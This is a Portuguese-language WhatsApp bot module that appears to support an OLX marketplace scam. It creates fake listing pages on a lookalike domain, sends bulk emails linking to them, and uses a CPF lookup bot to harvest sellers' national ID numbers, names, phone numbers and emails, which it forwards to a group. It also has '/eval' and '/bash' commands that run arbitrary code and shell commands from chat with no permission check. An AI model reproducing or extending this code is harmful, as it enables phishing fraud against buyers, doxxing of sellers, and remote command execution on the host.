const { extrairDadosProduto } = require("../../js/produto.js");
const { enviarEmMassa } = require("../../js/envio-email.js");
const fs = require("fs");
const path = require("path");

// Sistema para rastrear mensagens que aguardam respostas de bots
if (!global.pendingResponses) {
  global.pendingResponses = {};
}

module.exports = async (conn, mek, dataVendas) => {
  try {
    const from = mek.key.remoteJid;
    const type = Object.keys(mek.message).find(
      (key) =>
        !["senderKeyDistributionMessage", "messageContextInfo"].includes(key)
    );

    // PREFIXO
    const prefix = "/";

    // Sistema de produtos em edição
    if (!global.produtosEmEdicao) {
      global.produtosEmEdicao = {};
    }

    // MENSAGENS
    const body =
      type === "conversation" && mek.message.conversation.startsWith(prefix)
        ? mek.message.conversation
        : type == "extendedTextMessage" &&
          mek.message[type].text.startsWith(prefix)
        ? mek.message[type].text
        : "";
    const budy =
      type === "conversation"
        ? mek.message.conversation
        : type === "extendedTextMessage"
        ? mek.message.extendedTextMessage.text
        : "";

    const comando = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase()
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/gi, "");
    const isCmd = body.startsWith(prefix);
    const args = body.trim().split(/ +/).slice(1);

    // Verificar se esta mensagem é uma resposta a um comando pendente
    checkIfResponseToCommand(conn, mek, budy);

    // Verificar se usuário está em modo de edição
    const usuarioEditando = global.produtosEmEdicao[from];
    const respondendo =
      type === "conversation" || type === "extendedTextMessage";

    const enviar = async (text) => {
      console.log("Enviando mensagem:", text);
      return conn.sendMessage(from, { text }, { quoted: mek });
    };

    // Função para gerar código aleatório de 10 caracteres
    const gerarCodigo = () => {
      const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      let codigo = "";
      for (let i = 0; i < 10; i++) {
        codigo += caracteres.charAt(
          Math.floor(Math.random() * caracteres.length)
        );
      }
      return codigo;
    };

    // Caminho para o arquivo de vendas
    const caminhoArquivo = path.join(__dirname, "../../data/vendas.json");

    // Função para salvar dados no arquivo JSON
    const salvarDados = () => {
      try {
        fs.writeFileSync(caminhoArquivo, JSON.stringify(dataVendas, null, 4));
        console.log("Dados salvos com sucesso em: " + caminhoArquivo);
        return true;
      } catch (erro) {
        console.error("Erro ao salvar dados:", erro);
        return false;
      }
    };

    // Função para iniciar o processo de perguntas
    const iniciarPerguntas = (codigo) => {
      const camposPerguntas = {
        linkProduto:
          "👀 Digite o *link do produto na OLX* (opcional, apenas pressione enter para pular):",
        produto: "📦 Digite o *nome do produto*:",
        valor: "💰 Digite o *valor do produto*:",
        dataVenda: "📅 Digite a *data da venda* (formato: DD/MM):",
        comprador: "👤 Digite o *nome do comprador*:",
        plataforma: "🌐 Digite a *plataforma de venda* (ex: OLX, Marketplace):",
        "vendedor.nome": "🧑‍💼 Digite o *nome do vendedor*:",
        "vendedor.localizacao": "📍 Digite a *localização do vendedor*:",
        "vendedor.avaliacao": "⭐ Digite a *avaliação do vendedor* (0-5):",
        "vendedor.produtosVendidos":
          "📊 Digite a *quantidade de produtos vendidos pelo vendedor*:",
        imagem: "🖼️ Digite a *URL da imagem*:",
      };

      // Iniciar objeto de edição
      global.produtosEmEdicao[from] = {
        codigo: codigo,
        etapaAtual: 0,
        campos: [
          "linkProduto",
          ...Object.keys(camposPerguntas).filter(
            (campo) => campo !== "linkProduto"
          ),
        ],
        perguntas: camposPerguntas,
        dadosExtraidos: null,
      };

      // Fazer a primeira pergunta (sobre o link)
      const primeiroCampo = global.produtosEmEdicao[from].campos[0]; // Garantir que estamos usando o campo correto
      const primeiraPergunta = camposPerguntas[primeiroCampo];

      // Enviar com pequeno atraso para garantir que a mensagem seja enviada após a confirmação
      setTimeout(() => {
        enviar(primeiraPergunta);
      }, 1000);
    };

    // Função para definir valor no objeto usando path
    const setNestedValue = (obj, path, value) => {
      if (path.includes(".")) {
        const parts = path.split(".");
        let current = obj;

        for (let i = 0; i < parts.length - 1; i++) {
          if (!current[parts[i]]) current[parts[i]] = {};
          current = current[parts[i]];
        }

        current[parts[parts.length - 1]] = value;
      } else {
        obj[path] = value;
      }
      return obj;
    };

    // Processar resposta de edição
    const processarResposta = async (resposta) => {
      const edicao = global.produtosEmEdicao[from];
      const campoAtual = edicao.campos[edicao.etapaAtual];
      const produtoIndex = dataVendas.findIndex(
        (p) => p.codigo === edicao.codigo
      );

      if (produtoIndex === -1) {
        enviar("❌ Erro: Produto não encontrado!");
        delete global.produtosEmEdicao[from];
        return;
      }

      // Caso especial: processamento do link do produto
      if (
        campoAtual === "linkProduto" &&
        resposta.trim() &&
        resposta.startsWith("https://")
      ) {
        enviar("⏳ Extraindo dados do produto... Aguarde um momento.");

        try {
          const resultado = await extrairDadosProduto(resposta.trim());
          if (resultado.sucesso === false)
            return enviar(
              "Não foi possível extrair dados do produto. Tente novamente."
            );

          if (resultado.sucesso && resultado.dados) {
            // Armazenar dados extraídos
            edicao.dadosExtraidos = resultado.dados;

            // Coletar todos os dados preenchidos em um array
            const camposPreenchidos = [];

            // Preencher campos automaticamente sem enviar mensagens individuais
            if (resultado.dados.titulo) {
              dataVendas[produtoIndex].produto = resultado.dados.titulo;
              camposPreenchidos.push(
                `✅ Nome do produto obtido: ${resultado.dados.titulo}`
              );
            }

            if (resultado.dados.preco) {
              dataVendas[produtoIndex].valor = Number(resultado.dados.preco);
              camposPreenchidos.push(
                `✅ Valor do produto obtido: R$ ${resultado.dados.preco}`
              );
              camposPreenchidos.push(`✅ Campo valor já está preenchido.`);
            }

            // Processar todas as imagens
            if (resultado.dados.imagens && resultado.dados.imagens.length > 0) {
              // Converter o campo imagem para um array
              dataVendas[produtoIndex].imagem = resultado.dados.imagens.filter(
                (img) => img.startsWith("https://img.olx.com.br/")
              );

              camposPreenchidos.push(
                `✅ Campo imagem já está preenchido com ${dataVendas[produtoIndex].imagem.length} imagem(ns).`
              );
            }

            if (resultado.dados.nomeDono) {
              dataVendas[produtoIndex].vendedor.nome = resultado.dados.nomeDono;
              camposPreenchidos.push(
                `✅ NOME DO VENDEDOR OBTIDO: ${resultado.dados.nomeDono}`
              );
            }

            if (resultado.dados.localizacao) {
              dataVendas[produtoIndex].vendedor.localizacao =
                resultado.dados.localizacao;
              camposPreenchidos.push(
                `✅ LOCALIZAÇÃO OBTIDA: ${resultado.dados.localizacao}`
              );
            }

            if (resultado.dados.titulo) {
              camposPreenchidos.push(`✅ Campo produto já está preenchido.`);
            }

            dataVendas[produtoIndex].plataforma = "OLX";

            // Enviar todos os campos preenchidos em uma única mensagem
            if (camposPreenchidos.length > 0) {
              await enviar(camposPreenchidos.join("\n"));
            }
          } else {
            enviar(
              "⚠️ Não foi possível extrair dados do link fornecido. Continuaremos com o preenchimento manual."
            );
          }
        } catch (error) {
          console.error("Erro ao processar link:", error);
          enviar(
            "⚠️ Erro ao processar o link. Continuaremos com o preenchimento manual."
          );
        }
        // Salvar após extrair dados do produto
        salvarDados();
      }
      // Processamento para o campo de imagem
      else if (campoAtual === "imagem") {
        // Se o usuário inserir uma URL de imagem manualmente
        if (resposta.trim()) {
          // Verificar se o campo imagem já é um array
          if (!Array.isArray(dataVendas[produtoIndex].imagem)) {
            dataVendas[produtoIndex].imagem = [];
          }

          // Adicionar a nova imagem ao array
          dataVendas[produtoIndex].imagem.push(resposta.trim());
          enviar(`✅ Imagem adicionada ao produto!`);
        }
        // Salvar após cada campo atualizado
        salvarDados();
      }
      // Processamento normal para outros campos
      else if (campoAtual !== "linkProduto") {
        // Converter valor para número quando necessário
        let valorProcessado = resposta;
        if (
          campoAtual === "valor" ||
          campoAtual === "vendedor.avaliacao" ||
          campoAtual === "vendedor.produtosVendidos"
        ) {
          valorProcessado = Number(resposta);
        }

        // Salvar resposta
        setNestedValue(dataVendas[produtoIndex], campoAtual, valorProcessado);
        // Salvar após cada campo atualizado
        salvarDados();
      }

      // Avançar para próxima etapa
      edicao.etapaAtual++;

      // Verificar se deve pular campos já preenchidos pelo link
      const camposPreenchidos = [];

      while (edicao.etapaAtual < edicao.campos.length) {
        const campoAtual = edicao.campos[edicao.etapaAtual];
        let campoPreenchido = false;

        // Verificação detalhada para cada campo se já está preenchido com valor válido
        if (
          campoAtual === "produto" &&
          dataVendas[produtoIndex].produto &&
          dataVendas[produtoIndex].produto.trim() !== ""
        ) {
          campoPreenchido = true;
          // Não adicionamos aqui pois já foi adicionado durante o processamento do link
        } else if (
          campoAtual === "valor" &&
          dataVendas[produtoIndex].valor > 0
        ) {
          campoPreenchido = true;
          // Não adicionamos aqui pois já foi adicionado durante o processamento do link
        } else if (
          campoAtual === "dataVenda" &&
          dataVendas[produtoIndex].dataVenda &&
          dataVendas[produtoIndex].dataVenda.trim() !== ""
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(`✅ Campo dataVenda já está preenchido.`);
        } else if (
          campoAtual === "comprador" &&
          dataVendas[produtoIndex].comprador &&
          dataVendas[produtoIndex].comprador.trim() !== ""
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(`✅ Campo comprador já está preenchido.`);
        } else if (
          campoAtual === "plataforma" &&
          dataVendas[produtoIndex].plataforma &&
          dataVendas[produtoIndex].plataforma.trim() !== ""
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(`✅ Campo plataforma já está preenchido.`);
        } else if (
          campoAtual === "vendedor.nome" &&
          dataVendas[produtoIndex].vendedor &&
          dataVendas[produtoIndex].vendedor.nome &&
          dataVendas[produtoIndex].vendedor.nome.trim() !== ""
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(`✅ Campo vendedor.nome já está preenchido.`);
        } else if (
          campoAtual === "vendedor.localizacao" &&
          dataVendas[produtoIndex].vendedor &&
          dataVendas[produtoIndex].vendedor.localizacao &&
          dataVendas[produtoIndex].vendedor.localizacao.trim() !== ""
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(
            `✅ Campo vendedor.localizacao já está preenchido.`
          );
        } else if (
          campoAtual === "vendedor.avaliacao" &&
          dataVendas[produtoIndex].vendedor &&
          dataVendas[produtoIndex].vendedor.avaliacao > 0
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(
            `✅ Campo vendedor.avaliacao já está preenchido.`
          );
        } else if (
          campoAtual === "vendedor.produtosVendidos" &&
          dataVendas[produtoIndex].vendedor &&
          dataVendas[produtoIndex].vendedor.produtosVendidos > 0
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(
            `✅ Campo vendedor.produtosVendidos já está preenchido.`
          );
        } else if (
          campoAtual === "imagem" &&
          Array.isArray(dataVendas[produtoIndex].imagem) &&
          dataVendas[produtoIndex].imagem.length > 0
        ) {
          campoPreenchido = true;
          camposPreenchidos.push(
            `✅ Campo imagem já está preenchido com ${dataVendas[produtoIndex].imagem.length} imagem(ns).`
          );
        } else if (campoAtual === "linkProduto") {
          // Para o link do produto, sempre considere como "preenchido" se já foi processado
          // mesmo que esteja vazio, pois é opcional
          if (edicao.etapaAtual > 0) {
            campoPreenchido = true;
          }
        }

        if (campoPreenchido) {
          console.log(`Campo ${campoAtual} já preenchido, pulando...`);
          edicao.etapaAtual++;
        } else {
          break; // Encontrou um campo não preenchido, sai do loop
        }
      }

      // Se tiver campos preenchidos, mostra em uma única mensagem
      if (camposPreenchidos.length > 0) {
        await enviar(
          `TODOS OS DADOS PREENCHIDOS JUNTOS\n\n${camposPreenchidos.join("\n")}`
        );
      }

      // Verificar se terminou
      if (edicao.etapaAtual >= edicao.campos.length) {
        // Salvar dados finais antes de concluir
        if (salvarDados()) {
          enviar(
            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://olxcentralvendas.online/pag/?id=${edicao.codigo}`
          );
        } else {
          enviar(
            `⚠️ Produto cadastrado, mas houve um problema ao salvar os dados permanentemente. Código: ${edicao.codigo}`
          );
        }
        delete global.produtosEmEdicao[from];
      } else {
        // Próxima pergunta
        const proximoCampo = edicao.campos[edicao.etapaAtual];
        const proximaPergunta = edicao.perguntas[proximoCampo];
        await enviar(proximaPergunta);
      }
    };

    // Se estiver no modo de edição e receber uma mensagem sem comando
    if (usuarioEditando && respondendo && !isCmd) {
      processarResposta(budy);
      return;
    }

    if (isCmd) console.log(`[ CMD ] ${comando} - ${from} - ${budy}`);

    switch (comando) {
      case "menor":
        enviar("Maior da cu de Sp");
        break;

      case "enviar":
        // Verificar se há argumentos (emails e código do produto)
        if (args.length < 1) {
          return enviar(
            "⚠️ Uso: /email <email1,email2,email3...> [código_produto]"
          );
        }

        // Extrair emails e código do produto
        const emailsRaw = args[0].split(",").map((email) => email.trim());
        const codigoProduto = args.length > 1 ? args[1] : null;

        // Filtrar emails válidos
        const emailsValidos = emailsRaw.filter((email) => {
          return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        });

        if (emailsValidos.length === 0) {
          return enviar("⚠️ Nenhum e-mail válido encontrado!");
        }

        // Iniciar processo de envio
        await enviar(
          `⏳ Iniciando envio para ${emailsValidos.length} emails...`
        );

        try {
          // Passar os emails para a função de envio em massa
          await enviarEmMassa(emailsValidos, codigoProduto);

          // Mensagem de sucesso
          await enviar(
            `✅ E-mails enviados com sucesso para ${emailsValidos.length} destinatários!`
          );
        } catch (error) {
          console.error("Erro no envio de emails:", error);
          await enviar("❌ Ocorreu um erro durante o envio dos e-mails.");
        }
        break;

      case "olx":
        var toText = args.join(" ");
        if (!toText) return enviar("⚠️ Você não digitou o link do produto.");
        if (!toText.match(/\d{10}/g)) return enviar("⚠️ Link inválido.");

        console.log({ toText });
        enviar("⏳ Extraindo dados do produto... Aguarde um momento.");

        try {
          const extrairDados = require("../../js/olx-cpfdados");
          const resultado = await extrairDados.buscarInfoComId(
            toText.match(/\d{10}/g)[0]
          );

          if (resultado && resultado.dadosFormatados.includes("Indisponível"))
            return enviar("⚠️ Não foi possível extrair dados do produto.");

          // Grupo de origem onde enviamos o comando
          const origemGrupo = "120363400171925124@g.us";
          // Grupo de destino onde queremos receber a resposta
          const destinoGrupo = "120363397924256528@g.us"; // ou um ID específico para outro grupo

          // Enviar a mensagem para o grupo de origem
          conn
            .sendMessage(origemGrupo, {
              text: resultado.dadosFormatados,
            })
            .then((sentMsg) => {
              // Registrar que estamos aguardando uma resposta
              global.pendingResponses[origemGrupo] = {
                command: resultado.dadosFormatados,
                timestamp: Date.now(),
                targetGroup: destinoGrupo, // para onde enviar a resposta quando receber
              };

              enviar("✅ Comando enviado! Aguardando resposta...");

              // Opcional: definir um timeout para limpar comandos não respondidos
              setTimeout(() => {
                if (global.pendingResponses[origemGrupo]) {
                  delete global.pendingResponses[origemGrupo];
                  return conn.sendMessage(from, {
                    text: "Tempo limite excedido para resposta do comando.",
                  });
                }
              }, 30000); // 30 segundos de timeout
            });
        } catch (error) {
          enviar("⚠️ Ocorreu um erro ao extrair dados do produto.");
          console.error("Erro ao extrair dados do produto:", error);
        }
        break;

      case "novo":
        const novoItem = {
          codigo: gerarCodigo(),
          linkProduto: "",
          produto: "",
          valor: 0,
          dataVenda: "",
          comprador: "",
          plataforma: "",
          vendedor: {
            nome: "",
            localizacao: "",
            avaliacao: 0,
            produtosVendidos: 0,
          },
          imagem: [],
        };
        dataVendas.push(novoItem);

        salvarDados();

        const mensagem = `✅ Novo item criado com sucesso!\nCódigo: ${novoItem.codigo}\n\nVamos preencher os dados do produto. Responda as perguntas a seguir:`;

        await enviar(mensagem);

        return iniciarPerguntas(novoItem.codigo);

        break;

      case "cancelar":
        if (usuarioEditando) {
          delete global.produtosEmEdicao[from];
          enviar("❌ Edição cancelada!");
        } else {
          enviar("Não há nenhuma edição em andamento.");
        }
        break;

      case "eval":
        try {
          eval(`(async () => {
            try {
            ${budy.slice(5)};
            } catch(err) {
            toErro(err);
            }
            })();`);
        } catch (err) {
          toErro(err);
        }
        break;

      case "bash":
        const { exec } = require("child_process");
        var text = args.join(" ");
        exec(text, (erro, stdoutk) => {
          if (erro) return enviar(`Ocorreu um erro, ${erro}`);
          if (stdoutk) {
            return enviar(stdoutk.trim());
          }
        });
        break;

      default:
        break;
    }
  } catch (error) {
    console.error("Erro ao processar mensagem:", error);
  }
};

// Função para verificar se a mensagem atual é uma resposta a algum comando pendente
async function checkIfResponseToCommand(conn, message, budy) {
  try {
    const groupId = message.key.remoteJid;

    // Verificar se este grupo tem comandos aguardando resposta
    if (!global.pendingResponses[groupId]) return;

    // Logs para depuração
    console.log("✓ Verificando resposta em grupo com comando pendente");
    console.log("→ De:", message.key.participant || "desconhecido");
    console.log("→ Texto recebido:", budy.substring(0, 50) + "...");

    // ID do bot que responde às consultas
    const botId = "5521959388618@s.whatsapp.net";

    // Verificar se a mensagem é do bot (mais flexível agora)
    const isBotMessage =
      message.key.fromMe === false &&
      (message.key.participant === botId ||
        message.key.participant?.includes("@broadcast"));

    // Verificar se o conteúdo parece ser uma resposta de consulta
    const isQueryResponse =
      budy.includes("Resultado da sua consulta") ||
      budy.includes("☞") ||
      budy.match(/CPF:\s*[\d.\-]+/i) ||
      budy.includes("Dados não encontrados") ||
      budy.includes("Você está consultando muito rápido");

    console.log("→ É mensagem do bot?", isBotMessage);
    console.log("→ Parece resposta de consulta?", isQueryResponse);

    if (isBotMessage && isQueryResponse) {
      const pendingCommand = global.pendingResponses[groupId];

      if (pendingCommand && pendingCommand.targetGroup) {
        console.log("✓ Encontrou comando pendente, processando resposta");

        function limparTexto(txt) {
          return txt
            .replace(/[\u200e\u200f\u00a0\r]/g, "")
            .replace(/[ \t]+\n/g, "\n")
            .replace(/\n{2,}/g, "\n\n")
            .trim();
        }

        const texto = limparTexto(budy);

        if (budy.includes("Você está consultando muito rápido")) {
          console.log("⚠️ Detectada mensagem de consulta muito rápida");
          conn.sendMessage(pendingCommand.targetGroup, {
            text: "⚠️ Você está consultando muito rápido. Por favor, aguarde alguns minutos e tente novamente.",
          });

          // Limpar o comando pendente
          delete global.pendingResponses[groupId];
          return;
        }

        // 1. Extrair CPF e Nome
        const cpfMatch = texto.match(/CPF:\s*([\d.\-]+)/i);
        const nomeMatch = texto.match(/NOME:\s*(.+)/i);

        const cpf = cpfMatch ? cpfMatch[1] : "Não encontrado";
        const nome = nomeMatch ? nomeMatch[1].trim() : "Não encontrado";

        console.log(`✓ Dados extraídos: CPF=${cpf}, Nome=${nome}`);

        // 2. Extrair todos os números de telefone com rótulos
        const numerosRaw =
          texto.match(/\(\d{2}\)\d{4,5}-\d{4}(?:\s*-\s*[^-\n]*)*/gi) || [];

        console.log(`✓ Números encontrados: ${numerosRaw.length}`);

        // 3. Separar entre WhatsApp e não-WhatsApp
        const numerosWhatsapp = [];
        const numerosNormais = [];

        numerosRaw.forEach((numero, index) => {
          const isWhatsapp = /whatsapp/i.test(numero);
          const prefixo = index === 0 ? "★ " : "   ";
          const item = `${prefixo}${numero.trim()}`;
          if (isWhatsapp) {
            numerosWhatsapp.push(item);
          } else {
            numerosNormais.push(item);
          }
        });

        // 4. Extrair e-mails
        const emailsRaw = texto.match(/[\w.+-]+@[\w.-]+\.\w+/g) || [];
        const emailsFormatados = emailsRaw.map((email) => `   ${email}`);

        console.log(`✓ E-mails encontrados: ${emailsRaw.length}`);

        // 5. Montar mensagem final
        const resposta = `CPF: ${cpf}
Nome: ${nome}

- ✅ NÚMEROS COM WHATSAPP (${numerosWhatsapp.length}):
${
  numerosWhatsapp.length > 0
    ? numerosWhatsapp.join("\n")
    : "   Nenhum encontrado"
}

- 📞 NÚMEROS SEM WHATSAPP (${numerosNormais.length}):
${
  numerosNormais.length > 0 ? numerosNormais.join("\n") : "   Nenhum encontrado"
}

- ✉️ E-MAILS (${emailsFormatados.length}):
${
  emailsFormatados.length > 0
    ? emailsFormatados.join("\n")
    : "   Nenhum encontrado"
}
`.trim();

        // Enviar a resposta para o grupo
        console.log("→ Enviando resposta para:", pendingCommand.targetGroup);

        conn
          .sendMessage(pendingCommand.targetGroup, { text: resposta })
          .then(() => {
            console.log("✅ Resposta enviada com sucesso!");
          })
          .catch((err) => {
            console.error("❌ Erro ao enviar resposta:", err.message);
          });

        // Limpar o comando pendente
        delete global.pendingResponses[groupId];
        console.log("✅ Resposta processada e comando pendente removido!");
      }
    }
  } catch (error) {
    console.error("❌ Erro ao verificar resposta de comando:", error);
    console.error("→ Stack trace:", error.stack);

    // Tentar obter informações do comando pendente para logs
    const pendingCommand = global.pendingResponses?.[message.key.remoteJid];
    if (pendingCommand) {
      console.error(
        "→ Havia um comando pendente para:",
        pendingCommand.targetGroup
      );
    }

    // Não remover o comando pendente em caso de erro para dar chance de processá-lo novamente
  }
}

// original
// async function checkIfResponseToCommand(conn, message, budy) {
//   try {
//     const groupId = message.key.remoteJid;

//     // Verificar se este grupo tem comandos aguardando resposta
//     if (global.pendingResponses[groupId]) {
//       // Verificar se a mensagem é de um bot (pode precisar adaptar este critério)
//       // Por exemplo, verificar se é uma resposta específica ou de um ID específico
//       const isBotResponse =
//         message.key.fromMe === false &&
//         message.key.participant === "5521959388618@s.whatsapp.net" &&
//         (budy.includes("*☞ Resultado da sua consulta:*\n") ||
//           "Dados não encontrados para o nome especificado" ||
//           "Você está consultando muito rápido."); // adaptar este critério para seu caso
//       // console.log("Resposta recebida de bot:", budy);

//       if (isBotResponse) {
//         const pendingCommand = global.pendingResponses[groupId];

//         if (pendingCommand && pendingCommand.targetGroup) {
//           function limparTexto(txt) {
//             return txt
//               .replace(/[\u200e\u200f\u00a0\r]/g, "")
//               .replace(/[ \t]+\n/g, "\n")
//               .replace(/\n{2,}/g, "\n\n")
//               .trim();
//           }

//           const texto = limparTexto(budy);

//           if (budy.includes("Você está consultando muito rápido.")) {
//             conn.sendMessage(pendingCommand.targetGroup, {
//               text: "⚠️ Você está consultando muito rápido. Por favor, aguarde alguns minutos e tente novamente.",
//             });
//             return;
//           }

//           // 1. Extrair CPF e Nome
//           const cpfMatch = texto.match(/CPF:\s*([\d.\-]+)/i);
//           const nomeMatch = texto.match(/NOME:\s*(.+)/i);

//           const cpf = cpfMatch ? cpfMatch[1] : "Não encontrado";
//           const nome = nomeMatch ? nomeMatch[1].trim() : "Não encontrado";

//           // 2. Extrair todos os números de telefone com rótulos
//           const numerosRaw =
//             texto.match(/\(\d{2}\)\d{4,5}-\d{4}(?:\s*-\s*[^-\n]*)*/gi) || [];

//           // 3. Separar entre WhatsApp e não-WhatsApp
//           const numerosWhatsapp = [];
//           const numerosNormais = [];

//           numerosRaw.forEach((numero, index) => {
//             const isWhatsapp = /whatsapp/i.test(numero);
//             const prefixo = index === 0 ? "★ " : "   ";
//             const item = `${prefixo}${numero.trim()}`;
//             if (isWhatsapp) {
//               numerosWhatsapp.push(item);
//             } else {
//               numerosNormais.push(item);
//             }
//           });

//           // 4. Extrair e-mails
//           const emailsRaw = texto.match(/[\w.+-]+@[\w.-]+\.\w+/g) || [];
//           const emailsFormatados = emailsRaw.map((email) => `   ${email}`);

//           // 5. Montar mensagem final
//           const resposta = `CPF: ${cpf}
// Nome: ${nome}

// - ✅ NÚMEROS COM WHATSAPP (${numerosWhatsapp.length}):
// ${numerosWhatsapp.join("\n")}

// - 📞 NÚMEROS SEM WHATSAPP (${numerosNormais.length}):
// ${numerosNormais.join("\n")}

// - ✉️ E-MAILS (${emailsFormatados.length}):
// ${emailsFormatados.join("\n")}
// `.trim();

//           // Enviar a resposta para o grupo
//           conn.sendMessage(pendingCommand.targetGroup, { text: resposta });

//           // Limpar o comando pendente
//           delete global.pendingResponses[groupId];
//           console.log("✅ Resposta recebida e encaminhada com sucesso!");
//         }
//       }
//     }
//   } catch (error) {
//     // await conn.sendMessage(pendingCommand.targetGroup, {
//     //   react: {
//     //     text: "❌",
//     //     key: message.key,
//     //   },
//     // });

//     return console.error("Erro ao verificar resposta de comando:", error);
//   }
// }
